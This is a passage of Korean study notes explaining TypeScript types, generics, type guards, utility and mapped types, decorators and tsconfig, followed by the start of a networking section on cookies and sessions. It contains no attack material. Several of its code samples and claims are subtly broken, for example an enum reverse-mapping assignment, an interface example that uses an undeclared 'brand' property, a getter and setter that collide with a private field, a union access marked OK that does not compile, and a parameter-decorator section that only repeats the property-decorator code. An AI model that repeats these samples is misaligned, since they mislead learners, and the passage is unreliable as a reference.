   ```

5. Tuple : 고정 된 길이와 각 요소의 타입이 지정되어 있는 배열, 만약 정의하지 않은 타입, 인덱스로 접근할 경우 오류 발생

   ```ts
   let arr: [string, number] = ["hi", 10];
   arr[1].concat("!"); // 에러
   arr[5] = "hello"; // 에러
   ```

6. Enum : 특정 값(상수)들의 집합, 인덱스 번호로도 접근할 수 있고 다른 문자열로 지정할 수도 있다. 일반 객체와 차이점은 수정이 불가하다.

   ```ts
   enum Avengers {
     Capt = 2,
     IronMan,
     Thor,
   }
   let hero: Avengers = Avengers[2]; // Capt
   let hero: Avengers = Avengers[4]; // Thor, IronMan과 Thor에 자동으로 인덱스 번호가 부여된다.
   ```

7. Any : 모든 타입에 대해서 허용

   ```ts
   let str: any = "hi";
   let num: any = 10;
   let arr: any = ["a", 2, true];
   ```

8. Void : 변수에 사용 시 undefined와 null만 할당을 허용하고, 함수에 사용 시 반환 값이 없다는 것을 의미하는 타입

   ```ts
   let unuseful: void = undefined;
   function notuse(): void {
     console.log("sth");
   }
   ```

9. Null

10. Undefined

11. Never : 함수의 끝에 절대 도달하지 않는다는 의미를 지닌 타입, 예시로 무한 루프를 발생시키는 함수나 항상 에러를 반환하는 함수의 출력 값으로 지정할 수 있다. void와의 차이점은 void는 null 혹은 undefined 값의 반환을 허용한다는 것이고 never는 never 이외에는 허용하지 않는다.

```ts
// 항상 오류 발생
function invalid(message: string): never {
  throw new Error(message);
}

// 무한 루프
function infiniteAnimate(): never {
  while (true) {
    infiniteAnimate();
  }
}
```

<br>

### # 함수 타입

- 타입스크립트에서는 함수의 인자를 모두 필수 값으로 간주한다. 따라서, 함수의 매개변수를 설정하면 undefined나 null이라도 인자로 넘겨야하며 컴파일러에서 정의된 매개변수 값이 넘어 왔는지 확인한다. 달리 말하면 정의된 매개변수 값만 받을 수 있고 추가로 인자를 받을 수 없다는 의미이다.

  ```ts
  function sum(a: number, b: number): number {
    return a + b;
  }
  sum(10, 20); // 30
  sum(10, 20, 30); // error, too many parameters
  sum(10); // error, too few parameters
  ```

<br>

### # 인터페이스 타입

- 여러 타입을 합쳐서 사용하는 타입, AND 연산자와 같이 모든 타입을 만족해야한다.

- 옵셔널(?) 속성을 활용하여 특정 타입을 옵셔널하게 사용할 수 있다.

- extends 키워드를 사용해 기존 인터페이스를 확장(상속) 하여 새로운 인터페이스를 만들 수 있다.

- 인터페이스끼리 합칠 때는 & (교차 타입, Intersection Type)를 사용하여 여러 타입을 동시에 만족하도록 할 수 있다.

- 선언 병합이 가능하다.

  ```ts
  interface Person {
    name: string;
    age: number;
  }

  interface Employee {
    employeeId: string;
    department?: string; // 옵셔널 속성
  }

  // Person과 Employee 타입을 모두 만족하는 타입 만들기 (교차 타입)
  type Staff = Person & Employee;

  const staffMember: Staff = {
    name: "Alice",
    age: 30,
    employeeId: "E123",
    // department는 선택적이라 안 적어도 됨
  };
  ```

- 기타 예시

  ```ts
  // 예제1: 기본 사용
  interface Example {
    name: string;
  }

  // 예제2: 옵션 속성 활용
  interface Example {
    name: string;
    hop?: number;
  }

  // 예제3: 읽기 전용 속성 활용
  interface Example {
    readonly name: string;
  }

  let myBeer: Example = {
    brand: "Belgian Monk",
  };
  myBeer.brand = "Korean Carpenter"; // error!

  // 비슷한 활용 : 읽기 전용 배열
  let arr: ReadonlyArray<number> = [1, 2, 3];
  arr.splice(0, 1); // error
  arr.push(4); // error
  arr[0] = 100; // error

  // 예제4: 정의되지 않은 속성 활용
  interface Example {
    brand?: string;
    [propName: string]: any;
  }

  // 예제5: 클래스 타입 활용
  interface Example {
    beerName: string;
    nameBeer(beer: string): void;
  }

  class myBeer implements Example {
    beerName: string = "Baby Guinness";
    nameBeer(b: string) {
      this.beerName = b;
    }
    constructor() {}
  }

  // 예제6: 인터페이스 확장
  interface Person {
    name: string;
  }
  interface Drinker {
    drink: string;
  }
  interface Developer extends Person, Drinker {
    skill: string;
  }
  let fe = {} as Developer;
  fe.name = "josh";
  fe.skill = "TypeScript";
  fe.drink = "Beer";

  // 예제7: 선언 병합
  interface Person {
    name: string;
  }

  // 같은 이름의 인터페이스가 또 선언됐지만, 타입스크립트가 두 선언을 합쳐서 처리
  interface Person {
    age: number;
  }

  const p: Person = {
    name: "Lee",
    age: 30, // age 프로퍼티가 정상적으로 인식됨
  };
  ```

<br>

### # 클래스에서의 타입스크립트 활용

- readonly : 클래스의 속성에 readonly 키워드를 사용하면 아래와 같이 접근만 가능합니다.

  ```ts
  class Developer {
    readonly name: string;
    constructor(theName: string) {
      this.name = theName;
    }
  }
  let john = new Developer("John");
  john.name = "John"; // error! name is readonly.
  ```

- Accessor : 타입스크립트는 객체의 특정 속성의 접근과 할당에 대해 제어할 수 있다.

  ```ts
  class Developer {
    private name: string;

    get name(): string {
      // getter는 클래스 필드에 접근할 때마다 클래스 필드의 값을 조작하는 행위가 필요할 때 사용한다. 참조 시에 호출된다.
      return this.name;
    }

    set name(newValue: string) {
      // setter는 클래스 필드에 값을 할당할 때마다 클래스 필드의 값을 조작하는 행위가 필요할 때 사용한다. 클래스 필드에 값 할당 시 호출된다.
      if (newValue && newValue.length > 5) {
        throw new Error("이름이 너무 깁니다");
      }
      this.name = newValue;
    }
  }
  const josh = new Developer();
  josh.name = "Josh Bolton"; // Error
  josh.name = "Josh";
  ```

- Abstract Class : 추상 클래스(Abstract Class)는 인터페이스와 비슷한 역할을 하면서도 조금 다른 특징을 갖고 있다. 추상 클래스는 특정 클래스의 상속 대상이 되는 클래스이며 좀 더 상위 레벨에서 속성, 메서드의 모양을 정의한다.

  ```ts
  abstract class Developer {
    abstract coding(): void; // 'abstract'가 붙으면 상속 받은 클래스에서 무조건 구현해야 함
    drink(): void {
      console.log("drink sth");
    }
  }

  class FrontEndDeveloper extends Developer {
    coding(): void {
      // Developer 클래스를 상속 받은 클래스에서 무조건 정의해야 하는 메서드
      console.log("develop web");
    }
    design(): void {
      console.log("design web");
    }
  }
  const dev = new Developer(); // error: cannot create an instance of an abstract class
  const josh = new FrontEndDeveloper();
  josh.coding(); // develop web
  josh.drink(); // drink sth
  josh.design(); // design web
  ```

<br>

### # 제네릭(Generic) 타입

- 제네릭이란?

  함수, 클래스, 인터페이스 등에서 타입을 고정하지 않고 사용하는 시점에 타입을 외부로부터 주입받아 사용하는 문법이다.

  ```ts
  function getText<T>(text: T): T {
    return text;
  }

  getText<string>("hi");
  getText<number>(10);
  getText<boolean>(true);
  ```

- 제네릭 타입의 제한 (제네릭 타입 프로퍼티 접근 시 문제점)

  제네릭 타입은 구체적인 타입이 정해지지 않았기 때문에, 타입에 따라 존재하지 않을 수도 있는 프로퍼티나 메서드에 접근하려고 하면 컴파일 에러가 발생한다. 그렇기 때문에 타입 가드 혹은 제네릭 타입에 제약(extends)를 걸어 타입 범위를 좁혀야한다.

  ```ts
  // ❌ 에러: T 타입이 어떤 타입인지 알 수 없기 때문에 .length 사용 불가
  function logText<T>(text: T): T {
    console.log(text.length); // Error
    return text;
  }

  // ✅ 제네릭 타입에 배열 제약을 걸면 length 사용 가능
  function logText<T>(text: T[]): T[] {
    console.log(text.length);
    return text;
  }

  // ✅ 제네릭에 string을 확장한 제약을 걸면 .length 사용 가능
  function logText<T extends { length: number }>(text: T): T {
    console.log(text.length);
    return text;
  }
  ```

- 제네릭 인터페이스

  ```ts
  // 함수 자체에 제네릭 정의
  interface GenericLogTextFn {
    <T>(text: T): T;
  }

  function logText<T>(text: T): T {
    return text;
  }

  let myString: GenericLogTextFn = logText; // OK
  ```

  ```ts
  interface GenericLogTextFn<T> {
    (text: T): T;
  }

  const logText: GenericLogTextFn<string> = (text) => text;
  ```

- 제네릭 클래스

  ```ts
  class GenericMath<T> {
    pi: T;
    sum: (x: T, y: T) => T;

    constructor(pi: T, sum: (x: T, y: T) => T) {
      this.pi = pi;
      this.sum = sum;
    }
  }

  const math = new GenericMath<number>(3.14, (a, b) => a + b);
  ```

<br>

### # 타입 추론

- 타입 추론이란?

  타입 추론이란 타입을 따로 정의하지 않아도 자동으로 타입을 추론해주는 기능을 말한다. 정적 타입 언어의 단점은 타입을 정의하는데 많은 시간과 노력이 들기 때문에 생산성이 저하될 수 있다는 점이다.
  하지만 타입스크립트의 경우 타입 추론을 제공하기 때문에 필요한 경우에만 타입 정의를 할 수 있어 코드를 덜 작성하면서도 같은 수준의 타입 안정성을 유지할 수 있다. (but 명시적인 타입 선언이 안전하다)
  타입 추론은 몇 개의 표현식을 참고하여 최적의 공통 타입(베스트 커먼 타입 알고리즘)을 추론하거나 코드가 작성되는 흐름을 기반으로 타입(문맥상의 타이핑)을 추론한다.

- 타입스크립트의 타입 추론 방법

  1. 최적의 공통 타입(Best Common Type)

     여러 표현식이 동시에 존재하는 경우, 모든 표현식에 공통으로 적용 가능한 가장 일반적인 타입을 찾아서 추론한다.

     ```ts
     let x = [0, 1, null]; // let x: (number | null)[]
     ```

  2. 문맥상의 타이핑(Contextual Typing)

     문맥상의 타이핑(타입 결정)은 코드의 위치(문맥)를 기준으로 일어난다.

     ```ts
     // 예제1 : Window.onmousedown 함수의 타입을 사용하여 오른쪽에 할당된 함수 표현식의 타입을 추론하고 mouseEvent의 프로퍼티가 아닌 kangaroo는 에러가 발생한다.
     window.onmousedown = function (mouseEvent) {
       console.log(mouseEvent.button); //<- OK
       console.log(mouseEvent.kangaroo); //<- Error!
     };

     // 예제2 : 변수에 할당되므로 함수가 명시적으로 any타입으로 추론되기 때문에 오류가 발생하지 않는다.
     const handler = function (uiEvent) {
       console.log(uiEvent.button); //<- OK
     };
     ```

<br>

### # 타입 가드

- 타입 가드란?

  타입 가드는 타입의 범위가 넓을 때 컴파일러가 타입을 추론할 수 있도록 타입의 범위를 축소시키는 것을 말한다.

- 타입 가드 방법

  - 1. typeof 활용

    ```ts
    function printValue(value: string | number) {
      if (typeof value === "string") {
        console.log(value.toUpperCase()); // value는 string으로 좁혀짐
      } else {
        console.log(value.toFixed(2)); // value는 number로 좁혀짐
      }
    }
    ```

  - 2. instanceof 활용

    ```ts
    class Dog {
      bark() {
        console.log("멍멍!");
      }
    }

    class Cat {
      meow() {
        console.log("야옹!");
      }
    }

    function speak(animal: Dog | Cat) {
      if (animal instanceof Dog) {
        animal.bark(); // Dog로 좁혀짐
      } else {
        animal.meow(); // Cat으로 좁혀짐
      }
    }
    ```

  - 3. in 연산자 활용

    ```ts
    type Developer = { name: string; skill: string };
    type Designer = { name: string; tool: string };

    function introduce(person: Developer | Designer) {
      if ("skill" in person) {
        console.log(
          `${person.name}는 개발자입니다. 사용하는 기술은 ${person.skill}`
        );
      } else {
        console.log(
          `${person.name}는 디자이너입니다. 사용하는 도구는 ${person.tool}`
        );
      }
    }
    ```

  - 4. 사용자 정의 커스텀

    ```ts
    // pet is Fish 형태의 반환 타입이 핵심. 이게 사용자 정의 타입 가드
    // x is Y 문법 : 조건을 만족하면 타입스크립트가 자동으로 타입 좁힘, as 보다 안전하다. 조건에 부합하지 않는 경우 타입을 좁히지 않음.
    type Fish = { swim: () => void };
    type Bird = { fly: () => void };

    function isFish(pet: Fish | Bird): pet is Fish {
      return (pet as Fish).swim !== undefined;
    }

    function move(pet: Fish | Bird) {
      if (isFish(pet)) {
        pet.swim(); // pet은 Fish로 좁혀짐
      } else {
        pet.fly(); // pet은 Bird로 좁혀짐
      }
    }
    ```

  - 5. 타입 단언 활용

    ```ts
    // 방법1: as(타입 단언)을 활용
    function someFunc(val: string | number, isNumber: boolean) {
      if (isNumber) {
        (val as number).toFixed(2);
        isNaN(val as number);
      } else {
        (val as string).split("");
        (val as string).toUpperCase();
        (val as string).length;
      }
    }
    ```

### # 타입 단언

- 타입 단언이란?

  타입 단언은 타입을 추론하지 못한 타입을 강제로 지정할 때 사용한다. as 키워드를 통해 타입 단언을 할 수 있다. 주의할 점은 잘못된 타입 단언은 컴파일 에러는 없지만 런타임 에러를 유발할 수 있으므로, 반드시 해당 값이 실제로 해당 타입임을 확신할 수 있을 때만 사용해야 한다. (ex API response type)

- 예시

  ```ts
  // 예시 1. 변수의 복사
  // 이 코드에서 a는 처음 선언 시 타입이 명시되지 않았기 때문에 any로 추론되고, b도 a의 타입을 그대로 따라가 any로 추론
  var a;
  a = 20;
  var b = a as number;
  ```

  ```ts
  // 예시 2. DOM API 조작
  // getElementById는 HTMLElement | null을 반환하기 때문에 null이 아님을 확신할 수 있는 경우 as HTMLDivElement를 사용하여 타입 단언
  const myDiv = document.getElementById("my-div") as HTMLDivElement;
  myDiv.innerText = "Hello";
  ```

<br>

### # 타입 호환성

- 타입 호환성이란?

  타입 호환성이란 구조적 타이핑(Structural Typing) 기반으로 두 타입 간 멤버 구조를 비교해 한쪽 타입을 다른 쪽에 할당 가능한지를 결정하는 규칙이다.

- 예시

  - 인터페이스 호환성 예시

    요구 타입을 모두 만족하는 경우 가능

    ```tsx
    interface A {
      x: number;
    }

    interface B {
      x: number;
      y: number;
    }

    // A는 B로 할당 불가능 (요구 타입에 부족함)
    const a: A = { x: 1 };
    const b: B = a; // 오류! Property 'y'가 필요합니다.

    // B는 A로 할당 가능 (요구 타입을 모두 가지고 있음)
    const bb: B = { x: 1, y: 2 };
    const aa: A = bb;
    ```

  - 함수 호환성 예시

    매개변수가 적어지는건 가능, 함수 호출 시 매개변수를 초과하여 전달하여도 무시할 수 있으므로

    ```tsx
    type FuncA = (x: number) => number;
    type FuncB = (x: number, y: number) => number;

    // FuncA는 FuncB로 할당 가능 (필요한 매개변수가 적어지는건 가능)
    // fnB(10, 20) 시 내부적으로 fnA가 호출되어 x=10, y=20은 무시됨
    let fnA: FuncA = (x) => x * 2;
    let fnB: FuncB = fnA; // 가능

    // FuncB는 FuncA로 할당 불가능  (필요한 매개변수가 많아지는건 불가능)
    let fnBB: FuncB = (x, y) => x + y;
    let fnAA: FuncA = fnBB;
    ```

  - 제네릭의 호환성 예시

    기본적으로 호환되지 않음, any 제외

    ```tsx
    interface Box<T> {
      value: T;
    }

    let box1: Box<number>;
    let box2: Box<string>;

    box1 = box2; // 오류! 제네릭의 타입이 다르기 때문에 호환되지 않습니다.

    // 하지만 제네릭 타입이 실제로 사용되는 경우에는 호환됩니다.
    let numBox: Box<number>;
    let anyBox: Box<any>;

    numBox = anyBox; // 가능, 'any' 타입은 모든 타입과 호환됩니다.
    ```

<br>

### # 타입 별칭(타입 앨리어스)

- 타입 별칭은 특정 타입에 별칭을 부여하여 새로운 타입을 만들어내는 타입이다. 인터페이스와 같은 객체 타입, 원시 타입, 유니온, 튜플, 함수 타입 등 모든 타입을 별칭으로 만들 수 있다.

  ```ts
  // 예시1 : 타입 앨리어스, 빈 객체를 Person 타입으로 지정
  type Person = {
    name: string;
    age?: number;
  };

  const person = {} as Person;
  person.name = "Lee";
  person.age = 20;
  person.address = "Seoul"; // Error

  // 예시2 : 원시, 유니온, 함수 타입 등
  type A = string;
  type B = string | number;
  type C = (name: string, age: number) => string;
  ```

  ```ts
  type A = { x: number };
  type B = { y: string };

  // 교차 타입을 사용해서 확장한 새로운 타입 만들기
  type C = A & B;

  const c: C = { x: 1, y: "hello" };
  ```

<br>

### # 타입 별칭과 인터페이스 차이

1. 확장성

   타입 별칭은 직접적으로 확장(extends) 및 선언 병합이 불가능하고 인터페이스는 확장(extends) 및 선언 병합이 가능하다. 단 타입 별칭은 교차 선언을 통해 간접적으로 확장은 가능하다.

2. 생성 타입 형태

   타입 별칭은 객체 형태의 타입 외에도 원시 타입 혹은 값, 유니온 타입, 튜플 타입 등을 지정할 수 있고 인터페이스는 객체 형태의 타입을 지정한다.

3. 프리뷰

   타입 별칭은 프리뷰 시 타입 전체 구조를 보여주고 인터페이스는 타입 명을 보여준다.

<br>

### # 유틸리티 타입

- 유틸리티 타입이란?

  유틸리티 타입은 이미 정의해 놓은 타입을 변환하여 새로운 타입을 만들 때 사용하는 타입이다. 유틸리티 타입의 종류는 매우 다양하지만 대표적으로 파셜, 오밋, 픽 등의 타입이 있다.

- 자주 사용되는 유틸리티 타입

  - 파셜(Partial)

    파셜 타입은 특정 타입의 부분 집합을 만족하는 타입을 정의한다. 파셜을 사용하면 옵셔널 속성의 남발을 막을 수 있다.

    ```ts
    interface Address {
      email: string;
      address: string;
    }

    type MayHaveEmail = Partial<Address>;
    const me: MayHaveEmail = {}; // 가능
    const you: MayHaveEmail = { email: "test@abc.com" }; // 가능
    const all: MayHaveEmail = { email: "capt@hero.com", address: "Pangyo" }; // 가능
    ```

  - 픽(Pick)

    픽 타입은 특정 타입에서 몇 개의 속성을 선택하여 타입을 정의한다.

    ```ts
    interface Hero {
      name: string;
      skill: string;
    }

    const human: Pick<Hero, "name"> = {
      name: "스킬이 없는 사람",
    };
    ```

  - 오밋(Omit)

    오밋 타입은 픽과 반대로 특정 타입에서 지정된 속성만 제거한 타입을 정의한다.

    ```ts
    interface AddressBook {
      name: string;
      phone: number;
      address: string;
      company: string;
    }

    const phoneBook: Omit<AddressBook, "address"> = {
      name: "재택근무",
      phone: 12342223333,
      company: "내 방",
    };

    const chingtao: Omit<AddressBook, "address" | "company"> = {
      name: "중국집",
      phone: 44455557777,
    };
    ```

<br>

### # 맵드 타입

- 맵드 타입이란?

  맵드 타입(Mapped Types)은 keyof 연산자와 in 키워드를 이용해 기존 객체 타입의 모든 속성을 변환하여 새로운 타입을 생성하는 타입이다.
  in 연산자를 활용하여 순회하며 in 연산자를 기준으로 좌항은 일반 변수(순회 대상이 순차적으로 반복 할당), 우항은 순회 대상(유니온 타입)이다.

- 예시

  - 예제1 : 기본 문법

    ```ts
    { [ P in K ] : T }
    { [ P in K ] ? : T }
    { readonly [ P in K ] : T }
    { readonly [ P in K ] ? : T }
    ```

  - 예제2: 유니온 타입 기반 객체 정의

    ```ts
    type Heroes = "Hulk" | "Capt" | "Thor";
    type HeroAges = { [K in Heroes]: number };

    const ages: HeroAges = {
      Hulk: 33,
      Capt: 100,
      Thor: 1000,
    };
    ```

  - 예제3 : Partial 직접 구현

    ```ts
    // keyof T: Person의 키인 age, name을 유니온 타입으로 추출 -> "age" | "name"
    // T[K]: T의 K 키에 해당하는 속성의 타입
    type Subset<T> = {
      [K in keyof T]?: T[K];
    };

    interface Person {
      age: number;
      name: string;
    }

    const ageOnly: Subset<Person> = { age: 23 };
    const nameOnly: Subset<Person> = { name: "Tony" };
    const ironman: Subset<Person> = { age: 23, name: "Tony" };
    const empty: Subset<Person> = {};
    ```

<br>

### # 유니온 타입, 인터섹션 타입

- 유니온 타입 (|)

  유니온 타입이란 OR 연산자와 같이 A이거나 B다를 의미하는 타입이다.

  ```ts
  let value: string | number;

  value = "hello"; // ✅ 가능
  value = 123; // ✅ 가능
  value = true; // ❌ 오류 - boolean은 해당 안 됨
  ```

  ```ts
  interface A {
    x: number;
    y: number;
  }

  interface B {
    x: number;
    z: number;
  }

  type AB = A | B;

  const obj: AB = { x: 10, y: 20 }; //  A 혹은 B 타입으로 초기화 되어야 함, 해당 코드는 A 타입으로 초기화

  // 공통된 속성 x만 접근 가능
  console.log(obj.x); // OK
  console.log(obj.y); // OK
  console.log(obj.z); // Error
  ```

- 인터섹션 타입 (&)

  인터섹션 타입은 AND 연산자와 같이 A와 B를 모두 만족하는 하나의 타입이다. 인터섹션 타입으로 인터페이스 타입 혹은 타입 별칭을 연결하는 경우 두 타입이 가진 모든 속성에 접근이 가능하다.

  ```ts
  type User = { name: string };
  type Admin = { role: string };

  type AdminUser = User & Admin;

  const person: AdminUser = {
    name: "Alice",
    role: "manager",
  };
  ```

  ```ts
  interface A {
    x: number;
    y: number;
  }

  interface B {
    z: string;
  }

  type AB = A & B;

  const obj: AB = {
    x: 10,
    y: 20,
    z: "hello",
  };

  console.log(obj.x); // 10
  console.log(obj.z); // hello
  ```

<br>

### # 타입스크립트 데코레이터

- 데코레이터란?

  데코레이터가 붙은 클래스, 메소드(함수) 및 변수 등에 데코레이터에서 정의된 기능이 동작하는 것을 의미한다.

- 메소드 데코레이터 : 메서드의 기능을 확장하는 역할을 한다.

  ```js
  function hello(constructFn: Function) {
    constructFn.prototype.hello = function () {
      console.log("hello");
    };
  }

  // 클래스 데코레이터
  @hello
  class Person {}

  const person = new Person();
  person.hello();
  ```

- 프로퍼티 데코레이터 : 클래스의 프로퍼티 선언에 사용되는 프로퍼티 데코레이터는 두 개의 인자를 받는다. 그리고 프로퍼티 데코레이터에서 Property Descriptor 형식으로 객체를 반환할 때는, 프로퍼티에 적용이 된다.

  (1) static 프로퍼티라면 클래스의 생성자 함수, 인스턴스 프로퍼티라면 클래스의 prototype 객체

  (2) 프로퍼티 이름

  ```js
  const writable =
    (canBeWritable: boolean) =>
    (target: any, propName: string): any => {
      return {
        writable: canBeWritable,
      };
    };

  class Person {
    @writable(false)
    name: string = "moaikang";
    constructor() {}
  }

  const person = new Person();
  person.name = "zz";
  console.log(person.name);
  ```

- 파라미터 데코레이터 : 파라미터 안에 들어가는 파라미터 데코레이터는 3개의 인자를 받는다.

  (1) static 메서드의 파라미터 데코레이터라면 클래스의 생성자 함수, 인스턴스의 메서드라면 prototype 객체

  (2) 파라미터 데코레이터가 적용된 메서드의 이름

  (3) 메서드 파라미터 목록에서의 index

  ```js
  const writable =
    (canBeWritable: boolean) =>
    (target: any, propName: string): any => {
      return {
        writable: canBeWritable,
      };
    };

  class Person {
    @writable(false)
    name: string = "moaikang";
    constructor() {}
  }

  const person = new Person();
  person.name = "zz";
  console.log(person.name);
  ```

<br>

### # 타입스크립트 실행 과정

- 2-4번은 타입 스크립트 컴파일러(TSC)가 수행, 5-7번은 브라우저, NodJS, 기타 자바스크립트 엔진 같은 자바스크립트 런타임이 실행

  1. 소스 코드 작성 : 프로그래머가 타입스크립트 코드 작성

  2. 파싱 : 타입스크립트 컴파일러가 소스 코드를 읽어 추상 문법 트리(AST)로 변환

  3. 타입 검사 : 타입스크립트 컴파일러가 추상 문법 트리(AST)를 기반으로 타입 규칙을 검사하여 오류 체크

  4. 트랜스 파일 : 타입 정보는 제거하고 타입스크립트 코드를 순수한 자바스크립트로 변환

  5. 런타임(자바스크립트 엔진) 실행 준비 : 브라우저, Nodejs 기타 자바스크립트 엔진이 코드를 받아서 다시 파싱 -> 추상 구문 트리 생성

  6. 바이트 코드 변환 및 최적화 : 자바스크립트 엔진 내부에서 추상 구문 트리를 바이트 코드 등 저수준 코드로 변환

  7. 코드 실행 : 런타임이 바이트 코드를 실행한다.

<br>

### # keyof와 typeof

- keyof 타입

  타입(인터페이스, 객체 타입 등)의 모든 프로퍼티 키를 유니온 타입으로 추출한다.

  ```ts
  interface BrandInterface {
    Nike: "nike";
    Adidas: "adidas";
    Puma: "puma";
  }

  let type: keyof BrandInterface; // 마우스 오버 시 : 'Nike' | 'Adidas' | 'Puma'
  ```

- typeof 변수명

  변수나 객체, 함수 등의 값(value) 에 대해 그 타입을 추출한다. 즉, typeof 변수명은 해당 변수의 타입을 가져오는 역할이다.

  ```ts
  enum BrandEnum {
    Nike = "nike",
    Adidas = "adidas",
    Puma = "puma",
  }

  let type1: typeof BrandEnum = {
    Nike: BrandEnum.Nike,
    Adidas: BrandEnum.Adidas,
    puma: BrandEnum.puma,
  }; // let type1: typeof BrandEnum
  let type2: keyof BrandEnum; // number | typeof Symbol.iterator | "toString" | "charAt" ...
  let type3: keyof typeof BrandEnum; // let type3: "Nike" | "Adidas" | "Puma"
  ```

  ```ts
  // 객체의 경우에도 enum과 똑같이 작동하는 것을 볼 수 있었다. 즉 enum 객체로 변환 되기 때문이다. typeof으로 타입을 얻은 뒤 keyof로 추출한다.
  const object = {
    Nike: "nike",
    Adidas: "adidas",
    Puma: "puma",
  };

  let type: keyof typeof object;
  ```

<br>

### # any와 Generic 차이

1. 반환 타입 유추

   함수의 any타입의 경우 함수의 반환 타입을 알기 어렵지만 제네릭 타입의 경우 호출 시 명시적으로 타입을 선언해줌으로서 반환 타입을 유추하기 쉽다.

   ```ts
   // any 타입
   function AnyReturnFunc(arg: any): any {
     return arg;
   }

   let numVar = AnyReturnFunc(123); // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움
   let strVar = AnyReturnFunc("ABC"); // // number 타입의 값인 123을 전달하였지만, 무슨 타입을 return 받는지 유추하기 어려움

   // Generic 타입
   function GenericReturnFunc<T>(arg: T): T {
     return arg;
   }

   let numVar = GenericReturnFunc<number>(123); // 명시적인 타입 선언 사용, 반환 값을 유추할 수 있다.
   ```

2. 프로퍼티 체크 유무

   함수의 any 타입은 매개변수의 프로퍼티를 체크하지 않고 제네릭 타입은 프로퍼티를 체크하므로 타입가드가 필요하기 때문에 사전에 에러를 방지할 수 있다.

   ```ts
   function AnyReturnFunc(arg: any): any {
     return arg.length; // 에러가 발생하지 않는다.
   }

   function GenericReturnFunc<T>(arg: T): T {
     return arg.length; // 제네릭 함수는 무슨 타입이 올지 모르기 때문에 length 프로퍼티를 사용할 수 없다는 에러 메시지를 노출한다.
   }
   ```

<br>

### # 타입스크립트 설정 파일 (tsconfig.json)

- tsconfig.json은 타입스크립트 컴파일러의 설정을 정의하는 파일이다. 이 파일에서 컴파일 옵션, strict 모드 설정, 타입 검사 규칙, 출력 경로 등 다양한 컴파일 규칙과 동작 방식을 지정할 수 있다.

  ```json
  // 예시
  {
    "compilerOptions": {
      "target": "ESNext", // 최신 JS로 트랜스파일
      "lib": ["DOM", "DOM.Iterable", "ESNext"], // 브라우저와 최신 JS API 사용
      "allowJs": true, // JS 파일도 컴파일 대상에 포함
      "skipLibCheck": true, // @types 패키지 검사 생략 (속도 개선)
      "esModuleInterop": true, // commonjs -> esmodule 호환성
      "allowSyntheticDefaultImports": true, // default import 허용
      "strict": true, // 모든 strict 옵션 활성화 (강력 추천)
      "forceConsistentCasingInFileNames": true, // 파일명 대소문자 엄격하게
      "module": "ESNext", // 모듈 시스템 (Next.js나 최신 번들러와 호환)
      "moduleResolution": "Node", // Node 방식 모듈 탐색
      "resolveJsonModule": true, // JSON import 허용
      "isolatedModules": true, // 각 파일을 개별 모듈로 취급
      "noEmit": true, // JS 파일을 실제로 생성하지 않음
      "jsx": "react-jsx" // React 17+ JSX 트랜스폼 사용
    },
    "include": ["src"], // 컴파일 대상 폴더
    "exclude": ["node_modules", "dist"] // 제외 폴더
  }
  ```

- tsconfig.json에서 strict: true 설정

  기본적으로 타입스크립트에서는 null과 undefined가 모든 타입의 하위 타입으로 간주되어서, 아무 변수나 null 또는 undefined 값을 가질 수 있다. strictNullChecks가 켜지면, null과 undefined는 오직 그 타입으로 명시적으로 지정된 변수에만 할당 가능하다. 즉, string 타입 변수에는 null이나 undefined를 할당할 수 없고, string | null 처럼 유니언 타입으로 명시해야만 할당할 수 있다.

  ```ts
  let name: string = "Alice";
  name = null; // 오류! 'null'은 'string' 타입에 할당 불가

  let age: number | null = null; // 가능: null을 포함하는 유니언 타입
  ```

  ```ts
  interface User {
    id: number;
    name: string;
    email?: string | null; // 이메일은 optional이고 null일 수도 있다
  }

  async function fetchUser(id: number): Promise<User | null> {
    const response = await fetch(`/api/user/${id}`);
    if (!response.ok) return null;
    return await response.json();
  }

  async function showUser(id: number) {
    const user = await fetchUser(id);

    // strict 모드라면 user가 null일 수 있으니 반드시 체크해야 한다
    if (user) {
      console.log(user.name);
      // email도 null일 수 있으니 옵셔널 체이닝으로 접근 가능
      console.log(user.email ?? "이메일 정보 없음");
    } else {
      console.log("유저를 찾을 수 없습니다.");
    }
  }
  ```

<br><br><br>

## # Network

<br>

### # 네트워크 용어

- 노드

  네트워크 내에서 데이터를 송신, 수신, 작성, 저장할 수 있는 연결 지점 혹은 장치(컴퓨터, 스마트폰, 라우터 등)이다.

- 네트워크

  여러 노드들이 연결되어 데이터를 주고 받을 수 있는 통신망

- 인터넷(Internet)

  전 세계 네트워크를 하나로 연결하는 거대한 컴퓨터 통신망

- 월드 와이드 웹(WWW)

  인터넷을 통해 접근할 수 있는 하이퍼텍스트 기반의 정보 공간이자 상호 연결된 문서 시스템

- 프로토콜(Protocol)

  컴퓨터나 원거리 통신 장비(네트워크 장비)에서 데이터 통신을 원활하게 하기 위해 정해놓은 통신 규약

<br>

### # 쿠키, 세션, 웹 스토리지

- 쿠키, 세션, 웹 스토리지란?

  - 쿠키

    사용자가 웹 사이트 접속 시 해당 웹 사이트의 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각, 브라우저는 이 데이터를 저장해놓고 필요 시 정보를 참조하거나 재사용

  - 세션

    사용자 별로 웹 사이트를 접속한 시점부터 연결을 끝내는 시점까지 상태를 유지시키는 기술이다. 쿠키를 기반으로 동작하지만 사용자 정보를 클라이언트 측이 아닌
    서버 측에서 관리하여 보안이 취약하다는 쿠키의 단점을 극복하고자 사용한다. 동작 방식은 클라이언트에서 로그인 요청 시 서버에서 세션(사용자 상태 정보)을 생성하고 저장한다.
    그 후 유니크한 세션 ID(사용자 식별 목적)를 생성하여 세션 ID를 클라이언트로 전달한다. 클라이언트는 전달받은 세션 ID를 쿠키에 저장하고 이후 요청 시 요청 헤더 쿠키에 세션 ID를 보내고
    서버는 세션 ID를 통해 사용자를 식별한다. 세션은 사용자 로그아웃, 만료 시 삭제된다.

  - 웹 스토리지

    웹 스토리지는 클라이언트에서 데이터 저장하기 위한 브라우저 저장소이다. Key, value 구조로 저장되며 로컬 스토리지와 세션 스토리지로 나뉜다.

    - 로컬 스토리지 : 모든 창에서 접근 가능, 삭제하지 않는 이상 영구적

    - 세션 스토리지 : 동일한 탭에서만 접근 가능, 탭이나 창을 닫을 때 제거

  - 쿠키, 세션, 웹 스토리지 사용 이유

    HTTP는 무상태(stateless) 프로토콜로, 요청과 응답 후 상태를 기억하지 않는다. 이런 특징으로 발생할 수 있는 문제의 예시로 클라이언트에서 사용자 아이디와 비밀번호를 담아
